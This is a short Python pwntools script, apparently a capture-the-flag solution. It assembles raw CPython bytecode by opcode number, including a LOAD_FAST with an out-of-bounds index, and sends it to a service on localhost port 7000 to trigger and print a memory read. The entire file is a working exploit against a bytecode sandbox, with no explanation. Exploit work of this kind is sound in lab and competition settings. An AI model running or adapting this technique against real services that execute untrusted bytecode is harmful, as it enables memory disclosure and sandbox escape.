from pwn import *

OPMAP = {
    "SETUP_ANNOTATIONS": 85,
    "LOAD_FAST": 124,
    "PRINT_EXPR": 70,
    "RETURN_VALUE": 83,
}


def assemble(ops):
    ret = b""
    for op, arg in ops:
        ret += bytes([OPMAP[op], arg])
    return ret


bc = assemble([
    ("SETUP_ANNOTATIONS", ord('"')),
    ("LOAD_FAST", 20),
    ("PRINT_EXPR", ord("!")),
    ("LOAD_FAST", 20),
    ("RETURN_VALUE", ord('"')),
])

r = remote("localhost", 7000)
r.sendlineafter(b"> ", bc)
print(r.recvall().decode())

r.close()
